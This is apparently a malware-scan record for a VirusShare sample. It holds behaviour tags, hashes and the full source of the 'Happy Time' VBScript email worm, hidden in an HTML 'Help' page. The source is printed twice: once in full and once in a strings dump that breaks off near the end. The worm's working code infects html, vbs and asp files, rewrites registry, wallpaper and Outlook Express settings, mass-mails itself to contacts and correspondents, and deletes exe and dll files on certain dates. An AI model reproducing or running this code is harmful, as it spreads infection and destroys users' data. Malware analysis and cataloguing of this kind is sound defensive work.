{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "RegRead": "May read registry keys",
            "Shell": "May run an executable file or a system command",
            "Shell.Application": "May run an application",
            "WINDOWS": "May enumerate application windows",
            "WScript.Shell": "May run an executable file or a system command",
            "Write": "May write to a file"
        },
        "macro": "<x-html>\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n<HTML><HEAD><TITLE>Help</TITLE>\n<META content=\"text/html; charset=iso-8859-1\" http-equiv=Content-Type><BASE \nhref=file://C:\\WINDOWS\\>\n<META content=\"MSHTML 5.00.2614.3500\" name=GENERATOR>\n<STYLE></STYLE>\n\n<META content=\"MSHTML 5.00.2614.3500\" name=GENERATOR>\n<META content=\"MSHTML 5.00.2614.3500\" name=GENERATOR></HEAD>\n<BODY bgColor=#ffffff>\n<DIV>\n<DIV><FONT face=Arial size=2>\nThis text contains a virus!\n</FONT></DIV>\n<DIV>\n<SCRIPT language=VBScript>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nRem I am sorry! happy time\nOn Error Resume Next\nmload\nSub mload()\nOn Error Resume Next\nmPath = Grf()\nSet Os = CreateObject(\"Scriptlet.TypeLib\")\nSet Oh = CreateObject(\"Shell.Application\")\nIf IsHTML Then\nmURL = LCase(document.Location)\nIf mPath = \"\" Then\nOs.Reset\nOs.Path = \"C:\\Help.htm\"\nOs.Doc = Lhtml()\nOs.Write()\nIhtml = \"<span style='position:absolute'><Iframe src='C:\\Help.htm' width='0' height='0'></Iframe></span>\"\nCall document.Body.insertAdjacentHTML(\"AfterBegin\", Ihtml)\nElse\nIf Iv(mPath, \"Help.vbs\") Then\nsetInterval \"Rt()\", 10000\nElse\nm = \"hta\"\nIf LCase(m) = Right(mURL, Len(m)) Then\nid = setTimeout(\"mclose()\", 1)\nmain\nElse\nOs.Reset()\nOs.Path = mPath & \"\\\" & \"Help.hta\"\nOs.Doc = Lhtml()\nOs.write()\nIv mPath, \"Help.hta\"\nEnd If\nEnd If\nEnd If\nElse\nmain\nEnd If\nEnd Sub\nSub main()\nOn Error Resume Next\nSet Of = CreateObject(\"Scripting.FileSystemObject\")\nSet Od = CreateObject(\"Scripting.Dictionary\")\nOd.Add \"html\", \"1100\"\nOd.Add \"vbs\", \"0100\"\nOd.Add \"htm\", \"1100\"\nOd.Add \"asp\", \"0010\"\nKs = \"HKEY_CURRENT_USER\\Software\\\"\nDs = Grf()\nCs = Gsf()\nIf IsVbs Then\nIf Of.FileExists(\"C:\\help.htm\") Then\nOf.DeleteFile (\"C:\\help.htm\")\nEnd If\nKey = CInt(Month(Date) + Day(Date))\nIf Key = 13 Then\nOd.RemoveAll\nOd.Add \"exe\", \"0001\"\nOd.Add \"dll\", \"0001\"\nEnd If\nCn = Rg(Ks & \"Help\\Count\")\nIf Cn = \"\" Then\nCn = 1\nEnd If\nRw Ks & \"Help\\Count\", Cn + 1\nf1 = Rg(Ks & \"Help\\FileName\")\nf2 = FNext(Of, Od, f1)\nfext = GetExt(Of, Od, f2)\nRw Ks & \"Help\\FileName\", f2\nIf IsDel(fext) Then\nf3 = f2\nf2 = FNext(Of, Od, f2)\nRw Ks & \"Help\\FileName\", f2\nOf.DeleteFile f3\nElse\nIf LCase(WScript.ScriptFullname) <> LCase(f2) Then\nFw Of, f2, fext\nEnd If\nEnd If\nIf (CInt(Cn) Mod 366) = 0 Then\nIf (CInt(Second(Time)) Mod 2) = 0 Then\nTsend\nElse\nadds = Og\nMsend (adds)\nEnd If\nEnd If\nwp = Rg(\"HKEY_CURRENT_USER\\Control Panel\\desktop\\wallPaper\")\nIf Rg(Ks & \"Help\\wallPaper\") <> wp Or wp = \"\" Then\nIf wp = \"\" Then\nn1 = \"\"\nn3 = Cs & \"\\Help.htm\"\nElse\nmP = Of.GetFile(wp).ParentFolder\nn1 = Of.GetFileName(wp)\nn2 = Of.GetBaseName(wp)\nn3 = Cs & \"\\\" & n2 & \".htm\"\nEnd If\nSet pfc = Of.CreateTextFile(n3, True)\nmt = Sa(\"1100\")\npfc.Write \"<\" & \"HTML><\" & \"body bgcolor='#007f7f' background='\" & n1 & \"'><\" & \"/Body><\" & \"/HTML>\" & mt\npfc.Close\nRw Ks & \"Help\\wallPaper\", n3\nRw \"HKEY_CURRENT_USER\\Control Panel\\desktop\\wallPaper\", n3\nEnd If\nElse\nSet fc = Of.CreateTextFile(Ds & \"\\Help.vbs\", True)\nfc.Write Sa(\"0100\")\nfc.Close\nbf = Cs & \"\\Untitled.htm\"\nSet fc2 = Of.CreateTextFile(bf, True)\nfc2.Write Lhtml\nfc2.Close\noeid = Rg(\"HKEY_CURRENT_USER\\Identities\\Default User ID\")\noe = \"HKEY_CURRENT_USER\\Identities\\\" & oeid & \"\\Software\\Microsoft\\Outlook Express\\5.0\\Mail\"\nMSH = oe & \"\\Message Send HTML\"\nCUS = oe & \"\\Compose Use Stationery\"\nSN = oe & \"\\Stationery Name\"\nRw MSH, 1\nRw CUS, 1\nRw SN, bf\nWeb = Cs & \"\\WEB\"\nSet gf = Of.GetFolder(Web).Files\nOd.Add \"htt\", \"1100\"\nFor Each m In gf\nfext = GetExt(Of, Od, m)\nIf fext <> \"\" Then\nFw Of, m, fext\nEnd If\nNext\nEnd If\nEnd Sub\nSub mclose()\ndocument.Write \"<\" & \"title>I am sorry!</title\" & \">\"\nwindow.Close\nEnd Sub\nSub Rt()\nDim mPath\nOn Error Resume Next\nmPath = Grf()\nIv mPath, \"Help.vbs\"\nEnd Sub\nFunction Sa(n)\nDim VBSText, m\nVBSText = Lvbs()\nIf Mid(n, 3, 1) = 1 Then\nm = \"<%\" & VBSText & \"%>\"\nEnd If\nIf Mid(n, 2, 1) = 1 Then\nm = VBSText\nEnd If\nIf Mid(n, 1, 1) = 1 Then\nm = Lscript(m)\nEnd If\nSa = m & vbCrLf\nEnd Function\nSub Fw(Of, S, n)\nDim fc, fc2, m, mmail, mt\nOn Error Resume Next\nSet fc = Of.OpenTextFile(S, 1)\nmt = fc.ReadAll\nfc.Close\nIf Not Sc(mt) Then\nmmail = Ml(mt)\nmt = Sa(n)\nSet fc2 = Of.OpenTextFile(S, 8)\nfc2.Write mt\nfc2.Close\nMsend (mmail)\nEnd If\nEnd Sub\nFunction Sc(S)\nmN = \"Rem I am sorry! happy time\"\nIf InStr(S, mN) > 0 Then\nSc = True\nElse\nSc = False\nEnd If\nEnd Function\nFunction FNext(Of, Od, S)\nDim fpath, fname, fext, T, gf\nOn Error Resume Next\nfname = \"\"\nT = False\nIf Of.FileExists(S) Then\nfpath = Of.GetFile(S).ParentFolder\nfname = S\nElseIf Of.FolderExists(S) Then\nfpath = S\nT = True\nElse\nfpath = Dnext(Of, \"\")\nEnd If\nDo While True\nSet gf = Of.GetFolder(fpath).Files\nFor Each m In gf\nIf T Then\nIf GetExt(Of, Od, m) <> \"\" Then\nFNext = m\nExit Function\nEnd If\nElseIf LCase(m) = LCase(fname) Or fname = \"\" Then\nT = True\nEnd If\nNext\nfpath = Pnext(Of, fpath)\nLoop\nEnd Function\nFunction Pnext(Of, S)\nOn Error Resume Next\nDim Ppath, Npath, gp, pn, T, m\nT = False\nIf Of.FolderExists(S) Then\nSet gp = Of.GetFolder(S).SubFolders\npn = gp.Count\nIf pn = 0 Then\nPpath = LCase(S)\nNpath = LCase(Of.GetParentFolderName(S))\nT = True\nElse\nNpath = LCase(S)\nEnd If\nDo While Not Er\nFor Each pn In Of.GetFolder(Npath).SubFolders\nIf T Then\nIf Ppath = LCase(pn) Then\nT = False\nEnd If\nElse\nPnext = LCase(pn)\nExit Function\nEnd If\nNext\nT = True\nPpath = LCase(Npath)\nNpath = Of.GetParentFolderName(Npath)\nIf Of.GetFolder(Ppath).IsRootFolder Then\nm = Of.GetDriveName(Ppath)\nPnext = Dnext(Of, m)\nExit Function\nEnd If\nLoop\nEnd If\nEnd Function\nFunction Dnext(Of, S)\nDim dc, n, d, T, m\nOn Error Resume Next\nT = False\nm = \"\"\nSet dc = Of.Drives\nFor Each d In dc\nIf d.DriveType = 2 Or d.DriveType = 3 Then\nIf T Then\nDnext = d\nExit Function\nElse\nIf LCase(S) = LCase(d) Then\nT = True\nEnd If\nIf m = \"\" Then\nm = d\nEnd If\nEnd If\nEnd If\nNext\nDnext = m\nEnd Function\nFunction GetExt(Of, Od, S)\nDim fext\nOn Error Resume Next\nfext = LCase(Of.GetExtensionName(S))\nGetExt = Od.Item(fext)\nEnd Function\nSub Rw(k, v)\nDim R\nOn Error Resume Next\nSet R = CreateObject(\"WScript.Shell\")\nR.RegWrite k, v\nEnd Sub\nFunction Rg(v)\nDim R\nOn Error Resume Next\nSet R = CreateObject(\"WScript.Shell\")\nRg = R.RegRead(v)\nEnd Function\nFunction IsVbs()\nDim ErrTest\nOn Error Resume Next\nErrTest = WScript.ScriptFullname\nIf Err Then\nIsVbs = False\nElse\nIsVbs = True\nEnd If\nEnd Function\nFunction IsHTML()\nDim ErrTest\nOn Error Resume Next\nErrTest = document.Location\nIf Er Then\nIsHTML = False\nElse\nIsHTML = True\nEnd If\nEnd Function\nFunction IsMail(S)\nDim m1, m2\nIsMail = False\nIf InStr(S, vbCrLf) = 0 Then\nm1 = InStr(S, \"@\")\nm2 = InStr(S, \".\")\nIf m1 <> 0 And m1 < m2 Then\nIsMail = True\nEnd If\nEnd If\nEnd Function\nFunction Lvbs()\nDim f, m, ws, Of\nOn Error Resume Next\nIf IsVbs Then\nSet Of = CreateObject(\"Scripting.FileSystemObject\")\nSet f = Of.OpenTextFile(WScript.ScriptFullname, 1)\nLvbs = f.ReadAll\nElse\nFor Each ws In document.scripts\nIf LCase(ws.Language) = \"vbscript\" Then\nIf Sc(ws.Text) Then\nLvbs = ws.Text\nExit Function\nEnd If\nEnd If\nNext\nEnd If\nEnd Function\nFunction Iv(mPath, mName)\nDim Shell\nOn Error Resume Next\nSet Shell = CreateObject(\"Shell.Application\")\nShell.NameSpace(mPath).Items.Item(mName).InvokeVerb\nIf Er Then\nIv = False\nElse\nIv = True\nEnd If\nEnd Function\nFunction Grf()\nDim Shell, mPath\nOn Error Resume Next\nSet Shell = CreateObject(\"Shell.Application\")\nmPath = \"C:\\\"\nFor Each mShell In Shell.NameSpace(mPath).Items\nIf mShell.IsFolder Then\nGrf = mShell.Path\nExit Function\nEnd If\nNext\nIf Er Then\nGrf = \"\"\nEnd If\nEnd Function\nFunction Gsf()\nDim Of, m\nOn Error Resume Next\nSet Of = CreateObject(\"Scripting.FileSystemObject\")\nm = Of.GetSpecialFolder(0)\nIf Er Then\nGsf = \"C:\\\"\nElse\nGsf = m\nEnd If\nEnd Function\nFunction Lhtml()\nLhtml = \"<\" & \"HTML\" & \"><HEAD\" & \">\" & vbCrLf & \"<\" & \"Title> Help </Title\" & \"><\" & \"/HEAD>\" & vbCrLf & \"<\" & \"Body> \" & Lscript(Lvbs()) & vbCrLf & \"<\" & \"/Body></HTML\" & \">\"\nEnd Function\nFunction Lscript(S)\nLscript = \"<\" & \"script language='VBScript'>\" & vbCrLf & S & \"<\" & \"/script\" & \">\"\nEnd Function\nFunction Sl(S1, S2, n)\nDim l1, l2, l3, i\nl1 = Len(S1)\nl2 = Len(S2)\ni = InStr(S1, S2)\nIf i > 0 Then\nl3 = i + l2 - 1\nIf n = 0 Then\nSl = Left(S1, i - 1)\nElseIf n = 1 Then\nSl = Right(S1, l1 - l3)\nEnd If\nElse\nSl = \"\"\nEnd If\nEnd Function\nFunction Ml(S)\nDim S1, S3, S2, T, adds, m\nS1 = S\nS3 = \"\"\"\"\nadds = \"\"\nS2 = S3 & \"mailto\" & \":\"\nT = True\nDo While T\nS1 = Sl(S1, S2, 1)\nIf S1 = \"\" Then\nT = False\nElse\nm = Sl(S1, S3, 0)\nIf IsMail(m) Then\nadds = adds & m & vbCrLf\nEnd If\nEnd If\nLoop\nMl = Split(adds, vbCrLf)\nEnd Function\nFunction Og()\nDim i, n, m(), Om, Oo\nSet Oo = CreateObject(\"Outlook.Application\")\nSet Om = Oo.GetNamespace(\"MAPI\").GetDefaultFolder(10).Items\nn = Om.Count\nReDim m(n)\nFor i = 1 To n\nm(i - 1) = Om.Item(i).Email1Address\nNext\nOg = m\nEnd Function\nSub Tsend()\nDim Od, MS, MM, a, m\nSet Od = CreateObject(\"Scripting.Dictionary\")\nMConnect MS, MM\nMM.FetchSorted = True\nMM.Fetch\nFor i = 0 To MM.MsgCount - 1\nMM.MsgIndex = i\na = MM.MsgOrigAddress\nIf Od.Item(a) = \"\" Then\nOd.Item(a) = MM.MsgSubject\nEnd If\nNext\nFor Each m In Od.Keys\nMM.Compose\nMM.MsgSubject = \"Fw: \" & Od.Item(m)\nMM.RecipAddress = m\nMM.AttachmentPathName = Gsf & \"\\Untitled.htm\"\nMM.Send\nNext\nMS.SignOff\nEnd Sub\nFunction MConnect(MS, MM)\nDim U\nOn Error Resume Next\nSet MS = CreateObject(\"MSMAPI.MAPISession\")\nSet MM = CreateObject(\"MSMAPI.MAPIMessages\")\nU = Rg(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\DefaultProfile\")\nMS.UserName = U\nMS.DownLoadMail = False\nMS.NewSession = False\nMS.LogonUI = True\nMS.SignOn\nMM.SessionID = MS.SessionID\nEnd Function\nSub Msend(Address)\nDim MS, MM, i, a\nMConnect MS, MM\ni = 0\nMM.Compose\nFor Each a In Address\nIf IsMail(a) Then\nMM.RecipIndex = i\nMM.RecipAddress = a\ni = i + 1\nEnd If\nNext\nMM.MsgSubject = \" Help \"\nMM.AttachmentPathName = Gsf & \"\\Untitled.htm\"\nMM.Send\nMS.SignOff\nEnd Sub\nFunction Er()\nIf Err.Number = 0 Then\nEr = False\nElse\nErr.Clear\nEr = True\nEnd If\nEnd Function\nFunction IsDel(S)\nIf Mid(S, 4, 1) = 1 Then\nIsDel = True\nElse\nIsDel = False\nEnd If\nEnd Function\n\n\n</SCRIPT>\n</DIV></DIV></BODY></HTML>\n\n</x-html>"
    },
    "filename": "VirusShare_166ca5f7fb480b5882f8bb99ebd78b8b",
    "filesize": 10494,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "166ca5f7fb480b5882f8bb99ebd78b8b",
        "sha1": "f3d738b5ee0fcbc5d424333e9cf87bd836ed62e4",
        "sha256": "1970a499663a175946628ecf93acdabd64b97fa74eebb64e6f7e7763929493c7"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<x-html>",
            "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">",
            "<HTML><HEAD><TITLE>Help</TITLE>",
            "<META content=\"text/html; charset=iso-8859-1\" http-equiv=Content-Type><BASE ",
            "href=file://C:\\WINDOWS\\>",
            "<META content=\"MSHTML 5.00.2614.3500\" name=GENERATOR>",
            "<STYLE></STYLE>",
            "<META content=\"MSHTML 5.00.2614.3500\" name=GENERATOR>",
            "<META content=\"MSHTML 5.00.2614.3500\" name=GENERATOR></HEAD>",
            "<BODY bgColor=#ffffff>",
            "<DIV>",
            "<DIV><FONT face=Arial size=2>",
            "This text contains a virus!",
            "</FONT></DIV>",
            "<DIV>",
            "<SCRIPT language=VBScript>",
            "Rem I am sorry! happy time",
            "On Error Resume Next",
            "mload",
            "Sub mload()",
            "On Error Resume Next",
            "mPath = Grf()",
            "Set Os = CreateObject(\"Scriptlet.TypeLib\")",
            "Set Oh = CreateObject(\"Shell.Application\")",
            "If IsHTML Then",
            "mURL = LCase(document.Location)",
            "If mPath = \"\" Then",
            "Os.Reset",
            "Os.Path = \"C:\\Help.htm\"",
            "Os.Doc = Lhtml()",
            "Os.Write()",
            "Ihtml = \"<span style='position:absolute'><Iframe src='C:\\Help.htm' width='0' height='0'></Iframe></span>\"",
            "Call document.Body.insertAdjacentHTML(\"AfterBegin\", Ihtml)",
            "Else",
            "If Iv(mPath, \"Help.vbs\") Then",
            "setInterval \"Rt()\", 10000",
            "Else",
            "m = \"hta\"",
            "If LCase(m) = Right(mURL, Len(m)) Then",
            "id = setTimeout(\"mclose()\", 1)",
            "main",
            "Else",
            "Os.Reset()",
            "Os.Path = mPath & \"\\\" & \"Help.hta\"",
            "Os.Doc = Lhtml()",
            "Os.write()",
            "Iv mPath, \"Help.hta\"",
            "End If",
            "End If",
            "End If",
            "Else",
            "main",
            "End If",
            "End Sub",
            "Sub main()",
            "On Error Resume Next",
            "Set Of = CreateObject(\"Scripting.FileSystemObject\")",
            "Set Od = CreateObject(\"Scripting.Dictionary\")",
            "Od.Add \"html\", \"1100\"",
            "Od.Add \"vbs\", \"0100\"",
            "Od.Add \"htm\", \"1100\"",
            "Od.Add \"asp\", \"0010\"",
            "Ks = \"HKEY_CURRENT_USER\\Software\\\"",
            "Ds = Grf()",
            "Cs = Gsf()",
            "If IsVbs Then",
            "If Of.FileExists(\"C:\\help.htm\") Then",
            "Of.DeleteFile (\"C:\\help.htm\")",
            "End If",
            "Key = CInt(Month(Date) + Day(Date))",
            "If Key = 13 Then",
            "Od.RemoveAll",
            "Od.Add \"exe\", \"0001\"",
            "Od.Add \"dll\", \"0001\"",
            "End If",
            "Cn = Rg(Ks & \"Help\\Count\")",
            "If Cn = \"\" Then",
            "Cn = 1",
            "End If",
            "Rw Ks & \"Help\\Count\", Cn + 1",
            "f1 = Rg(Ks & \"Help\\FileName\")",
            "f2 = FNext(Of, Od, f1)",
            "fext = GetExt(Of, Od, f2)",
            "Rw Ks & \"Help\\FileName\", f2",
            "If IsDel(fext) Then",
            "f3 = f2",
            "f2 = FNext(Of, Od, f2)",
            "Rw Ks & \"Help\\FileName\", f2",
            "Of.DeleteFile f3",
            "Else",
            "If LCase(WScript.ScriptFullname) <> LCase(f2) Then",
            "Fw Of, f2, fext",
            "End If",
            "End If",
            "If (CInt(Cn) Mod 366) = 0 Then",
            "If (CInt(Second(Time)) Mod 2) = 0 Then",
            "Tsend",
            "Else",
            "adds = Og",
            "Msend (adds)",
            "End If",
            "End If",
            "wp = Rg(\"HKEY_CURRENT_USER\\Control Panel\\desktop\\wallPaper\")",
            "If Rg(Ks & \"Help\\wallPaper\") <> wp Or wp = \"\" Then",
            "If wp = \"\" Then",
            "n1 = \"\"",
            "n3 = Cs & \"\\Help.htm\"",
            "Else",
            "mP = Of.GetFile(wp).ParentFolder",
            "n1 = Of.GetFileName(wp)",
            "n2 = Of.GetBaseName(wp)",
            "n3 = Cs & \"\\\" & n2 & \".htm\"",
            "End If",
            "Set pfc = Of.CreateTextFile(n3, True)",
            "mt = Sa(\"1100\")",
            "pfc.Write \"<\" & \"HTML><\" & \"body bgcolor='#007f7f' background='\" & n1 & \"'><\" & \"/Body><\" & \"/HTML>\" & mt",
            "pfc.Close",
            "Rw Ks & \"Help\\wallPaper\", n3",
            "Rw \"HKEY_CURRENT_USER\\Control Panel\\desktop\\wallPaper\", n3",
            "End If",
            "Else",
            "Set fc = Of.CreateTextFile(Ds & \"\\Help.vbs\", True)",
            "fc.Write Sa(\"0100\")",
            "fc.Close",
            "bf = Cs & \"\\Untitled.htm\"",
            "Set fc2 = Of.CreateTextFile(bf, True)",
            "fc2.Write Lhtml",
            "fc2.Close",
            "oeid = Rg(\"HKEY_CURRENT_USER\\Identities\\Default User ID\")",
            "oe = \"HKEY_CURRENT_USER\\Identities\\\" & oeid & \"\\Software\\Microsoft\\Outlook Express\\5.0\\Mail\"",
            "MSH = oe & \"\\Message Send HTML\"",
            "CUS = oe & \"\\Compose Use Stationery\"",
            "SN = oe & \"\\Stationery Name\"",
            "Rw MSH, 1",
            "Rw CUS, 1",
            "Rw SN, bf",
            "Web = Cs & \"\\WEB\"",
            "Set gf = Of.GetFolder(Web).Files",
            "Od.Add \"htt\", \"1100\"",
            "For Each m In gf",
            "fext = GetExt(Of, Od, m)",
            "If fext <> \"\" Then",
            "Fw Of, m, fext",
            "End If",
            "Next",
            "End If",
            "End Sub",
            "Sub mclose()",
            "document.Write \"<\" & \"title>I am sorry!</title\" & \">\"",
            "window.Close",
            "End Sub",
            "Sub Rt()",
            "Dim mPath",
            "On Error Resume Next",
            "mPath = Grf()",
            "Iv mPath, \"Help.vbs\"",
            "End Sub",
            "Function Sa(n)",
            "Dim VBSText, m",
            "VBSText = Lvbs()",
            "If Mid(n, 3, 1) = 1 Then",
            "m = \"<%\" & VBSText & \"%>\"",
            "End If",
            "If Mid(n, 2, 1) = 1 Then",
            "m = VBSText",
            "End If",
            "If Mid(n, 1, 1) = 1 Then",
            "m = Lscript(m)",
            "End If",
            "Sa = m & vbCrLf",
            "End Function",
            "Sub Fw(Of, S, n)",
            "Dim fc, fc2, m, mmail, mt",
            "On Error Resume Next",
            "Set fc = Of.OpenTextFile(S, 1)",
            "mt = fc.ReadAll",
            "fc.Close",
            "If Not Sc(mt) Then",
            "mmail = Ml(mt)",
            "mt = Sa(n)",
            "Set fc2 = Of.OpenTextFile(S, 8)",
            "fc2.Write mt",
            "fc2.Close",
            "Msend (mmail)",
            "End If",
            "End Sub",
            "Function Sc(S)",
            "mN = \"Rem I am sorry! happy time\"",
            "If InStr(S, mN) > 0 Then",
            "Sc = True",
            "Else",
            "Sc = False",
            "End If",
            "End Function",
            "Function FNext(Of, Od, S)",
            "Dim fpath, fname, fext, T, gf",
            "On Error Resume Next",
            "fname = \"\"",
            "T = False",
            "If Of.FileExists(S) Then",
            "fpath = Of.GetFile(S).ParentFolder",
            "fname = S",
            "ElseIf Of.FolderExists(S) Then",
            "fpath = S",
            "T = True",
            "Else",
            "fpath = Dnext(Of, \"\")",
            "End If",
            "Do While True",
            "Set gf = Of.GetFolder(fpath).Files",
            "For Each m In gf",
            "If T Then",
            "If GetExt(Of, Od, m) <> \"\" Then",
            "FNext = m",
            "Exit Function",
            "End If",
            "ElseIf LCase(m) = LCase(fname) Or fname = \"\" Then",
            "T = True",
            "End If",
            "Next",
            "fpath = Pnext(Of, fpath)",
            "Loop",
            "End Function",
            "Function Pnext(Of, S)",
            "On Error Resume Next",
            "Dim Ppath, Npath, gp, pn, T, m",
            "T = False",
            "If Of.FolderExists(S) Then",
            "Set gp = Of.GetFolder(S).SubFolders",
            "pn = gp.Count",
            "If pn = 0 Then",
            "Ppath = LCase(S)",
            "Npath = LCase(Of.GetParentFolderName(S))",
            "T = True",
            "Else",
            "Npath = LCase(S)",
            "End If",
            "Do While Not Er",
            "For Each pn In Of.GetFolder(Npath).SubFolders",
            "If T Then",
            "If Ppath = LCase(pn) Then",
            "T = False",
            "End If",
            "Else",
            "Pnext = LCase(pn)",
            "Exit Function",
            "End If",
            "Next",
            "T = True",
            "Ppath = LCase(Npath)",
            "Npath = Of.GetParentFolderName(Npath)",
            "If Of.GetFolder(Ppath).IsRootFolder Then",
            "m = Of.GetDriveName(Ppath)",
            "Pnext = Dnext(Of, m)",
            "Exit Function",
            "End If",
            "Loop",
            "End If",
            "End Function",
            "Function Dnext(Of, S)",
            "Dim dc, n, d, T, m",
            "On Error Resume Next",
            "T = False",
            "m = \"\"",
            "Set dc = Of.Drives",
            "For Each d In dc",
            "If d.DriveType = 2 Or d.DriveType = 3 Then",
            "If T Then",
            "Dnext = d",
            "Exit Function",
            "Else",
            "If LCase(S) = LCase(d) Then",
            "T = True",
            "End If",
            "If m = \"\" Then",
            "m = d",
            "End If",
            "End If",
            "End If",
            "Next",
            "Dnext = m",
            "End Function",
            "Function GetExt(Of, Od, S)",
            "Dim fext",
            "On Error Resume Next",
            "fext = LCase(Of.GetExtensionName(S))",
            "GetExt = Od.Item(fext)",
            "End Function",
            "Sub Rw(k, v)",
            "Dim R",
            "On Error Resume Next",
            "Set R = CreateObject(\"WScript.Shell\")",
            "R.RegWrite k, v",
            "End Sub",
            "Function Rg(v)",
            "Dim R",
            "On Error Resume Next",
            "Set R = CreateObject(\"WScript.Shell\")",
            "Rg = R.RegRead(v)",
            "End Function",
            "Function IsVbs()",
            "Dim ErrTest",
            "On Error Resume Next",
            "ErrTest = WScript.ScriptFullname",
            "If Err Then",
            "IsVbs = False",
            "Else",
            "IsVbs = True",
            "End If",
            "End Function",
            "Function IsHTML()",
            "Dim ErrTest",
            "On Error Resume Next",
            "ErrTest = document.Location",
            "If Er Then",
            "IsHTML = False",
            "Else",
            "IsHTML = True",
            "End If",
            "End Function",
            "Function IsMail(S)",
            "Dim m1, m2",
            "IsMail = False",
            "If InStr(S, vbCrLf) = 0 Then",
            "m1 = InStr(S, \"@\")",
            "m2 = InStr(S, \".\")",
            "If m1 <> 0 And m1 < m2 Then",
            "IsMail = True",
            "End If",
            "End If",
            "End Function",
            "Function Lvbs()",
            "Dim f, m, ws, Of",
            "On Error Resume Next",
            "If IsVbs Then",
            "Set Of = CreateObject(\"Scripting.FileSystemObject\")",
            "Set f = Of.OpenTextFile(WScript.ScriptFullname, 1)",
            "Lvbs = f.ReadAll",
            "Else",
            "For Each ws In document.scripts",
            "If LCase(ws.Language) = \"vbscript\" Then",
            "If Sc(ws.Text) Then",
            "Lvbs = ws.Text",
            "Exit Function",
            "End If",
            "End If",
            "Next",
            "End If",
            "End Function",
            "Function Iv(mPath, mName)",
            "Dim Shell",
            "On Error Resume Next",
            "Set Shell = CreateObject(\"Shell.Application\")",
            "Shell.NameSpace(mPath).Items.Item(mName).InvokeVerb",
            "If Er Then",
            "Iv = False",
            "Else",
            "Iv = True",
            "End If",
            "End Function",
            "Function Grf()",
            "Dim Shell, mPath",
            "On Error Resume Next",
            "Set Shell = CreateObject(\"Shell.Application\")",
            "mPath = \"C:\\\"",
            "For Each mShell In Shell.NameSpace(mPath).Items",
            "If mShell.IsFolder Then",
            "Grf = mShell.Path",
            "Exit Function",
            "End If",
            "Next",
            "If Er Then",
            "Grf = \"\"",
            "End If",
            "End Function",
            "Function Gsf()",
            "Dim Of, m",
            "On Error Resume Next",
            "Set Of = CreateObject(\"Scripting.FileSystemObject\")",
            "m = Of.GetSpecialFolder(0)",
            "If Er Then",
            "Gsf = \"C:\\\"",
            "Else",
            "Gsf = m",
            "End If",
            "End Function",
            "Function Lhtml()",
            "Lhtml = \"<\" & \"HTML\" & \"><HEAD\" & \">\" & vbCrLf & _",
            "\"<\" & \"Title> Help </Title\" & \"><\" & \"/HEAD>\" & vbCrLf & _",
            "\"<\" & \"Body> \" & Lscript(Lvbs()) & vbCrLf & _",
            "\"<\" & \"/Body></HTML\" & \">\"",
            "End Function",
            "Function Lscript(S)",
            "Lscript = \"<\" & \"script language='VBScript'>\" & vbCrLf & _",
            "S & \"<\" & \"/script\" & \">\"",
            "End Function",
            "Function Sl(S1, S2, n)",
            "Dim l1, l2, l3, i",
            "l1 = Len(S1)",
            "l2 = Len(S2)",
            "i = InStr(S1, S2)",
            "If i > 0 Then",
            "l3 = i + l2 - 1",
            "If n = 0 Then",
            "Sl = Left(S1, i - 1)",
            "ElseIf n = 1 Then",
            "Sl = Right(S1, l1 - l3)",
            "End If",
            "Else",
            "Sl = \"\"",
            "End If",
            "End Function",
            "Function Ml(S)",
            "Dim S1, S3, S2, T, adds, m",
            "S1 = S",
            "S3 = \"\"\"\"",
            "adds = \"\"",
            "S2 = S3 & \"mailto\" & \":\"",
            "T = True",
            "Do While T",
            "S1 = Sl(S1, S2, 1)",
            "If S1 = \"\" Then",
            "T = False",
            "Else",
            "m = Sl(S1, S3, 0)",
            "If IsMail(m) Then",
            "adds = adds & m & vbCrLf",
            "End If",
            "End If",
            "Loop",
            "Ml = Split(adds, vbCrLf)",
            "End Function",
            "Function Og()",
            "Dim i, n, m(), Om, Oo",
            "Set Oo = CreateObject(\"Outlook.Application\")",
            "Set Om = Oo.GetNamespace(\"MAPI\").GetDefaultFolder(10).Items",
            "n = Om.Count",
            "ReDim m(n)",
            "For i = 1 To n",
            "m(i - 1) = Om.Item(i).Email1Address",
            "Next",
            "Og = m",
            "End Function",
            "Sub Tsend()",
            "Dim Od, MS, MM, a, m",
            "Set Od = CreateObject(\"Scripting.Dictionary\")",
            "MConnect MS, MM",
            "MM.FetchSorted = True",
            "MM.Fetch",
            "For i = 0 To MM.MsgCount - 1",
            "MM.MsgIndex = i",
            "a = MM.MsgOrigAddress",
            "If Od.Item(a) = \"\" Then",
            "Od.Item(a) = MM.MsgSubject",
            "End If",
            "Next",
            "For Each m In Od.Keys",
            "MM.Compose",
            "MM.MsgSubject = \"Fw: \" & Od.Item(m)",
            "MM.RecipAddress = m",
            "MM.AttachmentPathName = Gsf & \"\\Untitled.htm\"",
            "MM.Send",
            "Next",
            "MS.SignOff",
            "End Sub",
            "Function MConnect(MS, MM)",
            "Dim U",
            "On Error Resume Next",
            "Set MS = CreateObject(\"MSMAPI.MAPISession\")",
            "Set MM = CreateObject(\"MSMAPI.MAPIMessages\")",
            "U = Rg(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\DefaultProfile\")",
            "MS.UserName = U",
            "MS.DownLoadMail = False",
            "MS.NewSession = False",
            "MS.LogonUI = True",
            "MS.SignOn",
            "MM.SessionID = MS.SessionID",
            "End Function",
            "Sub Msend(Address)",
            "Dim MS, MM, i, a",
            "MConnect MS, MM",
            "i = 0",
            "MM.Compose",
            "For Each a In Address",
            "If IsMail(a) Then",
            "MM.RecipIndex = i",
            "MM.RecipAddress = a",
            "i = i + 1",
            "End If",
            "Next",
            "MM.MsgSubject = \" Help \"",
            "MM.AttachmentPathName = Gsf & \"\\Untitled.htm\"",
            "MM.Send",
